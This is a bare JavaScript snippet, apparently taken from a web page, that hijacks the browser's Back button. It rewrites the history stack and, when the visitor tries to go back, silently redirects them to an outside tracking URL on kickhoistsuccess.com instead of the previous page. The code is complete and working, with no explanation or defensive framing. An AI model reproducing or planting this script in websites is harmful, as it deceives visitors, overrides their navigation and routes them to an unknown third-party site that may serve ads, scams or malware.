(function(window, location) { 
history.replaceState(null, document.title, location.pathname+"#!/history"); 
history.pushState(null, document.title, location.pathname); 
 
window.addEventListener("popstate", function() { 
  if(location.hash === "#!/history") { 
    history.replaceState(null, document.title, location.pathname); 
    setTimeout(function(){ 
      location.replace("https://kickhoistsuccess.com/dbci346e?key=785825480b5ae461f13a92d8e7518a82"); 
    },10); 
  } 
}, false); 
}(window, location));
